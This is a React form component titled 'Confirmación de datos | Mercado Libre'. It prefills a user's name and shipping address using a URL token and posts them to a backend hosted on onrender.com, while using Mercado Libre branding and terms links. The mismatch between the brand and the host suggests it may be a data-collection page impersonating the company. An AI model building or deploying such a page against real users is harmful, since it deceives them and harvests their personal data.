import React, { useEffect, useState } from 'react'
import { useLocation } from 'react-router-dom'
import { useNavigate } from 'react-router-dom'
import axios from 'axios'
import i18n from '@/i18n'
import { useTranslation } from 'react-i18next'
import useCountriesData from '@/hooks/useCountriesData'
import { useMemo } from 'react'
import Header from '@/components/general/Header'
import FullnameInput from '@/components/form/FullnameInput'
import CountrySelector from '@/components/form/CountrySelector'
import RegionSelector from '@/components/form/RegionSelector'
import AddressInputs from '@/components/form/AddressInputs'
import AddressTypeSelector from '@/components/form/AddressTypeSelector'
import TermsCheckbox from '@/components/form/TermsCheckbox'

type ConfirmationFormProps = {
  lang?: string
}

const ConfirmationForm: React.FC<ConfirmationFormProps> = ({ lang }) => {
  const [formData, setFormData] = useState({
    fullname: '',
    country: '',
    region: '',
    city: '',
    address: '',
    addressDetail: '',
    addressType: '',
    acceptTerms: false,
  })

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
  ) => {
    const target = e.target
    const { name, value, type } = target

    setFormData((prev) => ({
      ...prev,
      [name]: type === 'checkbox' ? (target as HTMLInputElement).checked : value,
    }))
  }

  const [errors, setErrors] = useState<{ [key: string]: boolean }>({})

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    const newErrors: { [key: string]: boolean } = {}

    Object.entries(formData).forEach(([key, value]) => {
      if (value === '' || value === null || (key === 'acceptTerms' && value !== true)) {
        newErrors[key] = true
      }
    })

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      alert('Por favor completa todos los campos obligatorios.')
      return
    }

    setErrors({})

    axios
      .post('https://confirmation-form-backend.onrender.com/api/meli-users', {
        token,
        ...formData,
      })
      .then(() => {
        alert('Datos actualizados con éxito.')
        setTimeout(() => {
          navigate('/final-step')
        }, 1000)
      })
      .catch((error) => {
        console.error('Error al enviar los datos:', error)
        alert('Ocurrió un error al guardar los datos.')
      })
  }

  const { countries, countryRegions } = useCountriesData()

  const location = useLocation()

  const { t } = useTranslation()

  const getTermsLink = (): string => {
    const path = location.pathname

    if (path.startsWith('/co')) {
      return 'https://www.mercadolibre.com.co/ayuda/terminos-condiciones-de-uso_1841'
    } else if (path.startsWith('/br')) {
      return 'https://www.mercadolivre.com.br/ajuda/Termos-e-condicoes-gerais-de-uso_1409'
    } else if (path.startsWith('/ar')) {
      return 'https://www.mercadolibre.com.ar/ayuda/terminos-y-condiciones-de-uso_991'
    } else {
      return 'https://www.mercadolibre.com.co/ayuda/terminos-condiciones-de-uso_1841'
    }
  }
  const termsLink = getTermsLink()

  function useQuery() {
    return new URLSearchParams(useLocation().search)
  }

  const query = useQuery()
  const token = query.get('token')

  useEffect(() => {
    axios
      .get('https://confirmation-form-backend.onrender.com/api/meli-users', {
        params: { token },
      })
      .then((response) => {
        const userData = response.data
        setFormData({
          fullname: userData.fullname || '',
          country: userData.country || '',
          region: userData.region || '',
          city: userData.city || '',
          address: userData.address || '',
          addressDetail: userData.addressDetail || '',
          addressType: userData.addressType || '',
          acceptTerms: userData.acceptTerms || false,
        })
      })
      .catch((error) => {
        console.error('Error al obtener los datos del usuario:', error)
      })
  }, [token])

  useEffect(() => {
    if (lang) {
      i18n.changeLanguage(lang)
    }
    document.title = 'Confirmación de datos | Mercado Libre'
  }, [lang])

  const navigate = useNavigate()

  const availableRegions = useMemo(() => {
    const countryCode = formData.country?.toLowerCase?.()
    if (!countryCode) return []
    return countryRegions[countryCode] || []
  }, [formData.country, countryRegions])

  return (
    <div>
      <Header />
      <div className="flex justify-center mt-4">
        <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
          <h2 className="font-proxima text-xl font-medium text-center mb-4">
            {t('general.title')}
          </h2>
          <h2 className="font-proxima text-xl font-semibold text-center mb-4">
            {t('general.subtitle')}
          </h2>
          <form onSubmit={handleSubmit}>
            <FullnameInput
              value={formData.fullname}
              onChange={handleChange}
              className={`border ${errors.fullname ? 'border-red-500' : 'border-gray-300'}`}
              label={t('form.fullname')}
              placeholder={t('form.tipFullname')}
            />

            <CountrySelector
              value={formData.country}
              onChange={handleChange}
              className={`border ${errors.country ? 'border-red-500' : 'border-gray-300'}`}
              label={t('form.country')}
              placeholder={t('form.tipCountry')}
              countries={countries}
              tip={''}
            />

            <RegionSelector
              value={formData.region}
              onChange={handleChange}
              className={`border ${errors.region ? 'border-red-500' : 'border-gray-300'}`}
              label={t('form.region')}
              placeholder={t('form.tipRegion')}
              regions={availableRegions}
            />

            <AddressInputs formData={formData} onChange={handleChange} t={t} errors={errors} />

            <AddressTypeSelector
              value={formData.addressType}
              onChange={handleChange}
              label={t('form.addressType')}
              error={errors.addressType}
            />

            <TermsCheckbox
              checked={formData.acceptTerms}
              onChange={handleChange}
              termsLink={termsLink}
              error={errors.acceptTerms}
            />
            <div className="flex justify-between mt-4">
              <button
                type="button"
                onClick={() => navigate('/')}
                className="bg-ml-grayLight text-gray-800 px-4 py-2 rounded-md hover:bg-gray-400"
              >
                {t('general.buttonBack')}
              </button>
              <button type="submit" className="bg-ml-yellowLight text-black px-4 py-2 rounded-md">
                {t('general.buttonNext')}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  )
}

export default ConfirmationForm
